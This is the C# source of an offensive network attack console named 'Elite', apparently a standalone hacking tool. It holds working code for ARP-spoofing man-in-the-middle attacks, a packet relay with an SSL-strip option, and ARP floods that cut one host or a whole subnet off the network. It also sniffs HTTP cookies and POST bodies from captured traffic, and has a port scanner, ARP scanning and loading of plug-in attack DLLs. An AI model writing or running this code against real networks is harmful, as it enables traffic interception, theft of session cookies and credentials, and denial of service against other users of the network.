using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Diagnostics;

namespace Elite
{
    public class Program
    {
        private static Dictionary<string, MethodInfo> Mods = new Dictionary<string, MethodInfo>();
        public static Dictionary<string, List<string>> LoadedMods = new Dictionary<string, List<string>>();
        public static string _version = "6.2.3";
        public static int commandTab = 20;
        public static int instructionTab = 50;
        public static string icon = @"            
                  00000000000000000                
             01001000101001010110110100            
           010101000100        1110100010          
         001010010100               11000100       
        010100100001                  0011010      
     001100       111                     0000     
    0101000                                0000    
    0010100                                00000   
   00001                                   110100  
   0111                                      10110 
  0000    000          000                    0000 
 00000    000000    000000                    1100 
011000      000000000 00                      10110
 00000       00 000000     Elite v{ver} CLI   00000
0  000           00                           1100 
   011          0000                         10100 
   0001        000000                         00000 
   01001                                      11010  
 001101000                                   00000  
 000100001                                  10110    
 00110100001                             00100     
   00111001001                         00100       
    00    0111111                   1001110        
            0110010100010100110100101001           
               010011100100011011100               
                 000 000000000000                  
                  00        0                       
";
        public static async Task Main(string[] args)
        {
            await Utility.LoadOuiDatabase();
            LoadMods();
            if (!Directory.Exists("mods")) { Directory.CreateDirectory(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "mods")); }

            string target_function = args[0]; 
            List<string> arguments = new List<string>();
            if (args[0] == "-help")
            {
                Console.WriteLine(icon.Replace("{ver}", _version));
                string[] methods = GetAllMethodNames();
                Dictionary<string, List<MethodInfo>> methodAll = new Dictionary<string, List<MethodInfo>>();
                foreach (string Funcmethod in methods)
                {
                    if (Funcmethod == "<Main>" || Funcmethod == "LoadMods")
                    {
                        continue;
                    }
                    try
                    {
                        string[] function = Funcmethod.Split('_');
                        if (!methodAll.ContainsKey(function[0]))
                        {
                            methodAll[function[0]] = new List<MethodInfo>();
                        }
                        var helpmethod = typeof(Program).GetMethod(Funcmethod, BindingFlags.NonPublic | BindingFlags.Static);
                        if (helpmethod != null)
                        {
                            methodAll[function[0]].Add(helpmethod);
                        }
                    } catch
                    {
                        continue;
                    }
                }

                foreach (var modMethod in Mods)
                {
                    string[] function = modMethod.Key.Split('_');
                    if (!methodAll.ContainsKey(function[0]))
                    {
                        methodAll[function[0]] = new List<MethodInfo>();
                    }
                    methodAll[function[0]].Add(modMethod.Value);
                }

                Console.WriteLine();
                int attacks = 0;
                foreach (var obj in methodAll.Values) { foreach (var target in obj) { attacks++; } }
                Console.WriteLine($"[ ATTACK TYPES: {methodAll.Keys.Count} | ATTACK METHODS: {attacks} | MANUFACTURERS: {Utility.ouiDictionary.Keys.Count} | MODS: {Mods.Keys.Count} ]");
                Console.WriteLine();

                Console.WriteLine("--------------------------------------------------------------\n");

                foreach (string methodName in methodAll.Keys)
                {
                    Console.WriteLine("[" + methodName + "]");
                    foreach (var methodTarget in methodAll[methodName])
                    {
                        object[] parameters = new object[] { new string[] { "help" } };
                        try {
                            var result = methodTarget.Invoke(null, parameters); 
                            if (result is Task taskResult)
                            {
                                await taskResult;
                            }
                        } catch { continue; }

                    }
                    Console.WriteLine();
                }
                return;
            }
            foreach (string arg in args)
            {
                if (arg.StartsWith("-") && !arg.StartsWith("--"))
                {
                    target_function = arg.Substring(1);
                } else
                {
                    arguments.Add(arg);
                }
            }
            Utility.WriteColor($"[+] Elite Console activated. [ATTACK: <{target_function}>]", new ConsoleColor[] { ConsoleColor.Blue });
            target_function = target_function.Replace('.', '_');
            var method = typeof(Program).GetMethod(target_function, BindingFlags.NonPublic | BindingFlags.Static);
            if (method != null)
            {
                object[] parameters = new object[] { arguments.ToArray() };
                var result = method.Invoke(null, parameters);
                if (result is Task taskResult)
                {
                    await taskResult;
                }
            } else if (method == null)
            {
                if (Mods.TryGetValue(target_function, out method))
                {
                    Console.WriteLine("[+] Executing mod...");
                    object[] parameters = new object[] { arguments.ToArray() };
                    var result = method.Invoke(null, parameters);
                    if (result is Task taskResult)
                    {
                        await taskResult;
                    }
                }
                else
                {
                    return;
                }
            }
        }

        private static void LoadMods()
        {
            string modsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "mods");
            if (!Directory.Exists(modsFolder))
            {
                return;
            }

            foreach (string modFolder in Directory.GetDirectories(modsFolder))
            {
                string dllPath = Path.Combine(modFolder, "main.dll");
                if (File.Exists(dllPath))
                {
                    try
                    {
                        var assembly = Assembly.LoadFrom(dllPath);
                        foreach (var type in assembly.GetTypes())
                        {
                            LoadedMods[type.Name] = new List<string>();
                            foreach (var method in type.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static))
                            {
                                string methodName = $"{method.Name}";
                                if (!Mods.ContainsKey(methodName))
                                {
                                    Mods.Add(methodName, method);
                                    LoadedMods[type.Name].Add(method.Name);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        continue;
                    }
                }
            }
        }

        public static string[] GetAllMethodNames()
        {
            var type = typeof(Program);

            var methods = type.GetMethods(BindingFlags.NonPublic | BindingFlags.Static);

            var methodNames = methods.Select(method => method.Name).ToArray();

            return methodNames;
        }

        private static async Task sys_dev_print(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "sys.dev.print".PadRight(commandTab, ' ');
                string instruction = "Print all available devices".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[FRIENDLY_NAME/NAME]");
                return;
            }
            string target = args[0];
            Dictionary<string, string> devices = Utility.GetDevices();
            string permtStr = "[FRIENDLY NAME]".PadRight(35, ' ');
            Console.WriteLine($"\n{permtStr}[NAME]");
            Console.WriteLine("------------------------------------------------------------------------------");
            foreach (string device in devices.Keys)
            {
                if (device == target || target == "all" || devices[device] == target)
                {
                    string devString = device.PadRight(35, ' ');
                    Console.WriteLine($"{devString}{devices[device]}");
                }
            }
        }

        private static async Task sys_oui_print(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "sys.oui.print".PadRight(commandTab, ' ');
                string instruction = "Print all available OUI from the database".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[MAC/OUI]");
                return;
            }
            string target = args[0];
            Dictionary<string, string> ouis = Utility.ouiDictionary;
            string permtStr = "[MAC]".PadRight(35, ' ');
            Console.WriteLine($"\n{permtStr}[OUI NAME]");
            Console.WriteLine("------------------------------------------------------------------------------");
            foreach (string oui in ouis.Keys)
            {
                if (oui == target || target == "all" || ouis[oui] == target)
                {
                    string ouiString = oui.PadRight(35, ' ');
                    Console.WriteLine($"{ouiString}{ouis[oui]}");
                }
            }
        }

        private static async Task sys_mod_print(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "sys.mod.print".PadRight(commandTab, ' ');
                string instruction = "Print all available mods".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[MAC/OUI]");
                return;
            }
            string target = args[0];
            Dictionary<string, List<string>> mods = LoadedMods;
            foreach (string mod in mods.Keys)
            {
                if (!mod.StartsWith("<") && !mod.EndsWith(">")) { Console.WriteLine($"[{mod}]"); }
                foreach (string modmethod in mods[mod])
                {
                    if (modmethod == target || target == "all" || modmethod == target)
                    {
                        Console.WriteLine($" - {modmethod}");
                    }
                }
            }
        }

        private static async Task eth_relay(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "eth.relay".PadRight(commandTab, ' ');
                string instruction = "Relay packets from devices".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE TARGET_MAC ROUTER_MAC SSL_STRIP]");
                return;
            }
            string Interface = args[0];
            string targetMAC = args[1];
            string routerMAC = args[2];
            bool sslstrip = false;
            bool.TryParse(args[3], out sslstrip);
            ICaptureDevice Device = Utility.GetListenerDevice(Interface);
            PhysicalAddress routerMacAddress = PhysicalAddress.Parse(routerMAC);
            PhysicalAddress targetMacAddress = PhysicalAddress.Parse(targetMAC);
            PhysicalAddress deviceMacAddress = Device.MacAddress;
            IInjectionDevice packetSender = Utility.GetInjDevice(Interface);
            int _packets = 0;
            Device.OnPacketArrival += (sender, e) =>
            {
                var rawPacket = e.GetPacket();

                if (rawPacket.LinkLayerType != LinkLayers.Ethernet)
                    return;

                Packet packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

                if (!(packet is EthernetPacket pkt))
                    return;

                var srcMac = pkt.SourceHardwareAddress;

                if (srcMac.Equals(routerMacAddress) || srcMac.Equals(targetMacAddress))
                {
                    var destMac = srcMac.Equals(routerMacAddress) ? targetMacAddress : routerMacAddress;

                    pkt.SourceHardwareAddress = deviceMacAddress;
                    pkt.DestinationHardwareAddress = destMac;

                    packetSender.SendPacket(pkt);
                    _packets++;
                    Utility.LineWriteColor($"\r[+] Packet received: [TOTAL: <{_packets}>]", new ConsoleColor[] { ConsoleColor.Red });
                }
            };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();
            Utility.WriteColor($"[+] Packet relay started. [TARGET: <{targetMAC}>] [ROUTER: <{routerMAC}>]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Red });
            while (true) { }
        }

        private static async Task eth_record(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "eth.record".PadRight(commandTab, ' ');
                string instruction = "Record all packets (PCAP Format)".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE FILE]");
                return;
            }
            string Interface = args[0];
            string targetFile = args[1];
            ICaptureDevice Device = Utility.GetListenerDevice(Interface);
            int _packets = 0;
            using (var fileStream = new FileStream(targetFile, FileMode.Create, FileAccess.Write))
            using (var pcapStream = new PcapStream(fileStream))
            {
                Device.OnPacketArrival += (sender, e) =>
                {
                    var packet = e.GetPacket();

                    pcapStream.Write(packet);

                    _packets++;
                    Utility.LineWriteColor($"\r[+] Packet received: [TOTAL: <{_packets}>]", new ConsoleColor[] { ConsoleColor.Red });
                };
                Device.Open(DeviceModes.Promiscuous, 0);
                Device.StartCapture();
                Utility.WriteColor($"[+] Packet recording started. [FILE: <{targetFile}>]", new ConsoleColor[] { ConsoleColor.Red });
                while (true) { }
            }
        }

        private static async Task arp_mitm(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "arp.mitm".PadRight(commandTab, ' ');
                string instruction = "Start ARP MITM (Spoofing) attack".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE TARGET_IP ROUTER_IP AUTO_FIND]");
                return;
            }
            string Interface = args[0];
            string targetIP = args[1];
            string routerIP = args[2];
            bool autoMACFind = true;
            bool.TryParse(args[3], out autoMACFind);
            string strtargetMAC = "";
            string strrouterMAC = "";
            if (args.Length > 4)
            {
                strtargetMAC = args[4];
                strrouterMAC = args[5];
            }
            Utility.WriteColor($"[+] MITM attack activated. [TARGET: <{targetIP}>] [ROUTER: <{routerIP}>] [INTERFACE {Interface}]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Red });
            try
            {
                LibPcapLiveDevice Device = Utility.GetSenderDevice(Interface);
                Device.OnPacketArrival += (sender, e) => { };
                Device.Open(DeviceModes.Promiscuous, 0);
                PhysicalAddress targetMAC;
                PhysicalAddress routerMAC;
                if (autoMACFind == true)
                {
                    targetMAC = Utility.GetMacAddress(Interface, Device, IPAddress.Parse(targetIP));
                    Utility.WriteColor($"[+] Target MAC address found. [<{targetMAC}>]", new ConsoleColor[] { ConsoleColor.Red });
                    routerMAC = Utility.GetMacAddress(Interface, Device, IPAddress.Parse(routerIP));
                    Utility.WriteColor($"[+] Router MAC address found. [<{routerMAC}>]", new ConsoleColor[] { ConsoleColor.Red });
                }
                else
                {
                    PhysicalAddress.TryParse(strtargetMAC, out targetMAC);
                    PhysicalAddress.TryParse(strrouterMAC, out routerMAC);
                }
                Device.StartCapture();
                EthernetPacket arpPacketTarget = new EthernetPacket(
                    Device.MacAddress,
                    targetMAC,
                    EthernetType.Arp);

                ArpPacket arpTarget = new ArpPacket(
                    ArpOperation.Response,
                    targetMAC,
                    IPAddress.Parse(targetIP),
                    Device.MacAddress,
                    IPAddress.Parse(routerIP));

                arpPacketTarget.PayloadPacket = arpTarget;

                EthernetPacket arpPacketSpoof = new EthernetPacket(
                    Device.MacAddress,
                    routerMAC,
                    EthernetType.Arp);

                ArpPacket arpSpoof = new ArpPacket(
                    ArpOperation.Response,
                    Device.MacAddress,
                    IPAddress.Parse(routerIP),
                    targetMAC,
                    IPAddress.Parse(targetIP));

                arpPacketSpoof.PayloadPacket = arpSpoof;
                Utility.WriteColor($"[+] ARP MITM attack started. [TARGET: <{targetIP}>] [ROUTER: <{routerIP}>]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Red });
                int _packets = 0;
                while (true)
                {
                    if (Device.Started == true && Device != null)
                    {
                        Device.SendPacket(arpPacketTarget);
                        _packets++;
                        Device.SendPacket(arpPacketSpoof);
                        _packets++;
                        Utility.LineWriteColor($"\r[+] MITM Packet sent: [TOTAL: <{_packets}>]", new ConsoleColor[] { ConsoleColor.Red });
                    }
                    await Task.Delay(1000);
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                Console.ResetColor();
            }
        }

        private static async Task arp_monitor(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "arp.monitor".PadRight(commandTab, ' ');
                string instruction = "Monitor ARP packets and show addresses".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE]");
                return;
            }
            string Interface = args[0];
            ICaptureDevice Device = Utility.GetListenerDevice(Interface);
            List<string> already = new List<string>();
            Device.OnPacketArrival += (sender, e) =>
            {

                Packet packet = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);

                if (packet is EthernetPacket pkt)
                {
                    if (pkt.PayloadPacket is ArpPacket arp)
                    {
                        if (already.Contains(arp.SenderHardwareAddress.ToString())) { return; }
                        string SenderIPPadding = $"[<{arp.SenderProtocolAddress.ToString()}>]".PadRight(20, ' ');
                        string SenderMACPadding = $"[<{arp.SenderHardwareAddress.ToString()}>]".PadRight(25, ' ');
                        string OUI = Utility.GetManufacturer(arp.SenderHardwareAddress.ToString());
                        Utility.WriteColor($"[+] Device Found. {SenderIPPadding}{SenderMACPadding}{OUI}", new ConsoleColor[] { ConsoleColor.Blue, ConsoleColor.Blue });
                        already.Add(arp.SenderHardwareAddress.ToString());
                    }
                }
            };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();
            while (true) { }
        }

        private static async Task arp_deauth(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "arp.deauth".PadRight(commandTab, ' ');
                string instruction = "Disconnect the target device with ARP".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE TARGET_IP]");
                return;
            }
            string Interface = args[0];
            string targetIP = args[1];
            LibPcapLiveDevice Device = Utility.GetSenderDevice(Interface);
            Device.OnPacketArrival += (sender, e) => { };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();
            int count = 0;
            try
            {
                while (true)
                {
                    string spoofIP = targetIP;
                    EthernetPacket arpPacketTarget = new EthernetPacket(
                    Device.MacAddress,
                    PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"),
                    EthernetType.Arp);

                    ArpPacket arpTarget = new ArpPacket(
                        ArpOperation.Response,
                        PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"),
                        IPAddress.Parse(targetIP),
                        Device.MacAddress,
                        IPAddress.Parse(spoofIP));

                    arpPacketTarget.PayloadPacket = arpTarget;
                    Device.SendPacket(arpPacketTarget);
                    count++;
                    Utility.LineWriteColor($"\r[+] ARP deauthentication started. [TARGET: <{targetIP}>] [FAKE IP: <{spoofIP}>]\t[{count} PACKETS]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Red });
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                Console.ResetColor();
            }
        }

        private static async Task arp_jammer(string[] args)
        {
            if (args.Length == 0 || args[0] == "help")
            {
                string paddedString = "arp.jammer".PadRight(commandTab, ' ');
                string instruction = "Disconnect multiple targets in the network".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE TARGET THREAD_LIMIT]");
                return;
            }

            string Interface = args[0];
            string targetIP = args[1];
            int threadLimit = 100;
            int.TryParse(args[2], out threadLimit);
            IPNetwork2 network = IPNetwork2.Parse(targetIP);
            LibPcapLiveDevice Device = Utility.GetSenderDevice(Interface);
            Device.OnPacketArrival += (sender, e) => { };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();

            int deviceCount;
            int.TryParse(network.ListIPAddress().Count.ToString(), out deviceCount);

            string routerIP = Utility.GetRouterIPAddress();

            int count = 0;
            var lockObj = new object();
            List<Task> tasks = new List<Task>();

            while (true)
            {
                try
                {
                    for (int i = 0; i < deviceCount; i++)
                    {
                        try
                        {
                            int currentIndex = i;

                            tasks.Add(Task.Run(() =>
                            {
                                string dst = network.ListIPAddress()[currentIndex].ToString();
                                string spoofIP = routerIP;

                                EthernetPacket arpPacketTarget = new EthernetPacket(
                                                Device.MacAddress,
                                                PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"),
                                                EthernetType.Arp);

                                ArpPacket arpTarget = new ArpPacket(
                                    ArpOperation.Response,
                                    PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"),
                                    IPAddress.Parse(dst),
                                    Device.MacAddress,
                                    IPAddress.Parse(spoofIP));

                                arpPacketTarget.PayloadPacket = arpTarget;
                                Device.SendPacket(arpPacketTarget);

                                lock (lockObj)
                                {
                                    count++;
                                    Utility.LineWriteColor($"\r[+] Network jammer started. [TARGET: <{dst}>] [FAKE IP: <{spoofIP}>]\t[{count} PACKETS | {tasks.Count} THREADS]", new ConsoleColor[] { ConsoleColor.Red, ConsoleColor.Red });
                                    if (tasks.Count > 0)
                                    {
                                        tasks.RemoveAt(0);
                                    }
                                }
                            }));
                        }
                        catch (Exception ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                            Console.ResetColor();
                        }
                        if (tasks.Count > threadLimit)
                        {
                            await Task.WhenAll(tasks.ToArray());
                        }
                    }
                } catch
                {
                    await Task.WhenAll(tasks.ToArray());
                }
            }
                
        }

        private static async Task arp_scan(string[] args)
        {
            if (args.Length == 0 || args[0] == "help")
            {
                string paddedString = "arp.scan".PadRight(commandTab, ' ');
                string instruction = "Send ARP packet to active devices in the network".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE RANGE]");
                return;
            }

            string Interface = args[0];
            string targetIP = args[1];
            IPNetwork2 network = IPNetwork2.Parse(targetIP);
            LibPcapLiveDevice Device = Utility.GetSenderDevice(Interface);
            Device.OnPacketArrival += (sender, e) => { };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();

            Console.WriteLine("[!] Please use -arp.monitor option to see the result.");

            foreach (IPAddress ip in network.ListIPAddress())
            {
                try
                {
                    Utility.LineWriteColor($"\r[+] Sending ARP request... [TARGET: <{ip.ToString()}>]", new ConsoleColor[] { ConsoleColor.Red });
                    PhysicalAddress MAC = Utility.GetMacAddress(Interface, Device, ip);
                } catch
                {
                    continue;
                }
            }
            Console.WriteLine("\n[+] Complete");
        }

        private static async Task tcp_portscan(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "tcp.portscan".PadRight(commandTab, ' ');
                string instruction = "Scan port for target device".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[TARGET_IP TIMEOUT RANGE(1~?)]");
                return;
            }
            string target = args[0];
            int timeout = Convert.ToInt32(args[1]);
            int startPort = Convert.ToInt32(args[2].Split('~')[0]);
            int endPort = Convert.ToInt32(args[2].Split('~')[1]);
            string request = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n";

            object LockObj = new object();

            Dictionary<int, string> OpenPorts = new Dictionary<int, string>();
            List<int> ClosePorts = new List<int>();

            double totalPorts = endPort - startPort + 1;
            List<Thread> Scanners = new List<Thread>();

            Console.WriteLine("\n[PORT]\t\t[STATE]\t\t[SERV]");

            for (int PORT = startPort; PORT <= endPort; PORT++)
            {
                double Percentage = (PORT - startPort) / totalPorts * 100;
                int amountofPorts = (int)totalPorts;
                string percent = Percentage.ToString("0");

                int currentPort = PORT;

                Thread scannerThread = new Thread(() =>
                {
                    try
                    {
                        using (TcpClient SCANNER = new TcpClient(target, currentPort))
                        {
                            try
                            {
                                string BANNER = "Unknown";
                                Thread bannerThread = new Thread(() =>
                                {
                                    try
                                    {
                                        NetworkStream stream = SCANNER.GetStream();
                                        stream.ReadTimeout = timeout;
                                        byte[] requestData = Encoding.UTF8.GetBytes(request);
                                        stream.Write(requestData, 0, requestData.Length);
                                        byte[] responseData = new byte[4096];
                                        int bytesRead = stream.Read(responseData, 0, responseData.Length);
                                        string response = Encoding.UTF8.GetString(responseData, 0, bytesRead);
                                        string[] lines = response.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                                        foreach (string line in lines)
                                        {
                                            if (line.StartsWith("Server:"))
                                            {
                                                BANNER = line.Substring("Server:".Length).Trim();
                                                break;
                                            }
                                        }
                                        if (BANNER == "Unknown")
                                        {
                                            string ResMessage = response.ToString();
                                            string FinalRes = ResMessage.Replace("\n", "\n\t");
                                            BANNER = "Unknown";
                                        }
                                    }
                                    catch (Exception error)
                                    {
                                        string Message = error.ToString();
                                        string FinalError = Message.Replace("\n", "\n\t");
                                        BANNER = "?";
                                    }
                                });
                                bannerThread.Start();
                                if (!bannerThread.Join(3000))
                                {
                                    bannerThread.Abort();
                                }
                                lock (LockObj)
                                {
                                    OpenPorts[currentPort] = BANNER;
                                    string remover = "                                                                                               ";
                                    Console.Write($"\r{remover}");
                                    Console.WriteLine($"\r{remover}\r{currentPort}\t\tOPEN\t\t{BANNER}");
                                }
                            }
                            catch (Exception)
                            {
                                lock (LockObj)
                                {
                                    ClosePorts.Add(currentPort);
                                }
                            }
                        }
                    }
                    catch
                    {
                        lock (LockObj)
                        {
                            ClosePorts.Add(currentPort);
                        }
                    }
                });

                Scanners.Add(scannerThread);
                scannerThread.Start();

                Console.Write($"\r[+] Start Scanning... [{(PORT - startPort + 1)}/{amountofPorts}] {percent}% ({startPort}~{endPort})");
            }

            foreach (Thread thread in Scanners)
            {
                thread.Join();
            }

            Console.WriteLine($"\n\n[+] Scan Complete. [OPEN: {OpenPorts.Count}] [CLOSE: {ClosePorts.Count}]");
        }

        private static async Task tcp_httpcookie(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "tcp.httpcookie".PadRight(commandTab, ' ');
                string instruction = "Capture all cookies from the TCP packets".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE]");
                return;
            }

            string Interface = args[0];
            ICaptureDevice Device = Utility.GetListenerDevice(Interface);

            Device.OnPacketArrival += (sender, e) =>
            {
                var rawPacket = e.GetPacket();

                if (rawPacket.LinkLayerType != LinkLayers.Ethernet)
                    return;

                Packet packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

                if (!(packet is EthernetPacket pkt))
                    return;

                if (packet.PayloadPacket is IPPacket ip_pkt)
                {
                    string ipAddress = ip_pkt.SourceAddress.ToString();
                    if (ip_pkt.PayloadPacket is TcpPacket tcp_pkt)
                    {
                        if (tcp_pkt.PayloadData.Length > 0)
                        {
                            string tcpPayload = System.Text.Encoding.ASCII.GetString(tcp_pkt.PayloadData);

                            if (tcpPayload.StartsWith("HTTP") || tcpPayload.StartsWith("GET") || tcpPayload.StartsWith("POST"))
                            {
                                var cookieLines = new List<string>();

                                using (var reader = new System.IO.StringReader(tcpPayload))
                                {
                                    string line;
                                    while ((line = reader.ReadLine()) != null)
                                    {
                                        if (line.StartsWith("Cookie:") || line.StartsWith("Set-Cookie:"))
                                        {
                                            cookieLines.Add(line);
                                        }

                                        if (string.IsNullOrWhiteSpace(line))
                                        {
                                            break;
                                        }
                                    }
                                }

                                if (cookieLines.Count > 0)
                                {
                                    Console.WriteLine($"[{ipAddress}]");
                                    foreach (var cookieLine in cookieLines)
                                    {
                                        var cookies = cookieLine.Split(new[] { "Cookie: ", "Set-Cookie: " }, StringSplitOptions.RemoveEmptyEntries);
                                        foreach (var cookie in cookies)
                                        {
                                            var pairs = cookie.Split(';');
                                            foreach (var pair in pairs)
                                            {
                                                var keyValue = pair.Split('=');
                                                if (keyValue.Length == 2)
                                                {
                                                    string key = keyValue[0].Trim();
                                                    string value = keyValue[1].Trim();
                                                    Console.WriteLine($"{key.PadRight(15)} = {value}");
                                                }
                                            }
                                        }
                                    }
                                    Console.WriteLine();
                                }
                            }
                        }
                    }
                }
            };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();
            Console.WriteLine("[+] TCP HTTP packet cookie capture started.");
            while (true) { }
        }

        private static async Task tcp_httppost(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "tcp.httppost".PadRight(commandTab, ' ');
                string instruction = "Capture all posts from the TCP packets".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[INTERFACE]");
                return;
            }

            string Interface = args[0];
            ICaptureDevice Device = Utility.GetListenerDevice(Interface);

            Dictionary<string, StringBuilder> tcpStreamData = new Dictionary<string, StringBuilder>();

            Device.OnPacketArrival += (sender, e) =>
            {
                var rawPacket = e.GetPacket();

                if (rawPacket.LinkLayerType != LinkLayers.Ethernet)
                    return;

                Packet packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

                if (!(packet is EthernetPacket pkt))
                    return;

                if (packet.PayloadPacket is IPPacket ip_pkt)
                {
                    if (ip_pkt.PayloadPacket is TcpPacket tcp_pkt)
                    {
                        if (tcp_pkt.PayloadData.Length > 0)
                        {
                            string tcpPayload = System.Text.Encoding.ASCII.GetString(tcp_pkt.PayloadData);

                            string streamKey = $"{ip_pkt.SourceAddress}:{tcp_pkt.SourcePort}->{ip_pkt.DestinationAddress}:{tcp_pkt.DestinationPort}";

                            if (!tcpStreamData.ContainsKey(streamKey))
                            {
                                tcpStreamData[streamKey] = new StringBuilder();
                            }

                            tcpStreamData[streamKey].Append(tcpPayload);

                            if (tcpStreamData[streamKey].ToString().StartsWith("POST"))
                            {
                                var payloadString = tcpStreamData[streamKey].ToString();
                                var contentLengthIndex = payloadString.IndexOf("Content-Length: ");
                                if (contentLengthIndex != -1)
                                {
                                    int startIndex = contentLengthIndex + "Content-Length: ".Length;
                                    int endIndex = payloadString.IndexOf("\r\n", startIndex);
                                    if (int.TryParse(payloadString.Substring(startIndex, endIndex - startIndex), out int contentLength))
                                    {
                                        string[] payloadParts = payloadString.Split(new[] { "\r\n\r\n" }, StringSplitOptions.None);
                                        if (payloadParts.Length > 1)
                                        {
                                            if (payloadParts[1].Length >= contentLength)
                                            {
                                                Console.WriteLine($"------------[{streamKey}]------------");
                                                Console.WriteLine(tcpStreamData[streamKey]);
                                                Console.WriteLine();

                                                tcpStreamData.Remove(streamKey);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            };
            Device.Open(DeviceModes.Promiscuous, 0);
            Device.StartCapture();
            Console.WriteLine("[+] TCP HTTP packet post capture started.");
            while (true) { }
        }

        private static async Task icmp_traceroute(string[] args)
        {
            if (args[0] == "help")
            {
                string paddedString = "icmp.traceroute".PadRight(commandTab, ' ');
                string instruction = "Trace the route to the target".PadRight(instructionTab, ' ');
                Console.WriteLine($"{paddedString}{instruction}[TARGET_IP DNS_QUERY]");
                return;
            }
            string ipAddr = args[0];
            bool dns_query = false;
            bool.TryParse(args[1], out dns_query);
            if (!IPAddress.TryParse(ipAddr, out IPAddress ipAddress))
            {
                Console.WriteLine("Invalid IP address format.");
                return;
            }

            Console.WriteLine($"Tracing route to {ipAddress}\n");

            using (Ping pingSender = new Ping())
            {
                PingOptions pingOptions = new PingOptions();
                pingOptions.DontFragment = true;

                int maxHops = 30;
                int timeout = 1000;
                byte[] buffer = new byte[32];
                PingReply reply = null;

                for (int ttl = 1; ttl <= maxHops; ttl++)
                {
                    pingOptions.Ttl = ttl;
                    try
                    {
                        reply = pingSender.Send(ipAddress, timeout, buffer, pingOptions);
                    }
                    catch (PingException ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"{ex.Message}\n{ex.StackTrace}");
                        Console.ResetColor();
                        break;
                    }

                    if (reply.Status == IPStatus.Success)
                    {
                        string DNS_Name = "";
                        if (dns_query == true)
                        {
                            try
                            {
                                DNS_Name = Dns.GetHostEntry(reply.Address.ToString()).HostName;
                            }
                            catch
                            {
                                DNS_Name = "";
                            }
                        }
                        Console.WriteLine($" {ttl}\t{reply.Address}\t{DNS_Name}");
                        break;
                    }
                    else if (reply.Status == IPStatus.TtlExpired || reply.Status == IPStatus.TimedOut)
                    {
                        string response_IP = reply.Address != null ? reply.Address.ToString() : "Request timed out.";
                        string DNS_Name = "";
                        if (dns_query == true)
                        {
                            try
                            {
                                DNS_Name = Dns.GetHostEntry(reply.Address.ToString()).HostName;
                            }
                            catch
                            {
                                DNS_Name = "";
                            }
                        }
                        if (response_IP == ipAddr) { response_IP = $"{response_IP} (Request timed out.)";  }
                        string response_IP_padding = response_IP.PadRight(40, ' ');
                        Console.WriteLine($" {ttl}\t{response_IP_padding}{reply.RoundtripTime}ms\t{DNS_Name}");
                    }
                    else
                    {
                        Console.WriteLine($" {ttl}\tError: {reply.Status}");
                        break;
                    }
                }
            }
        }
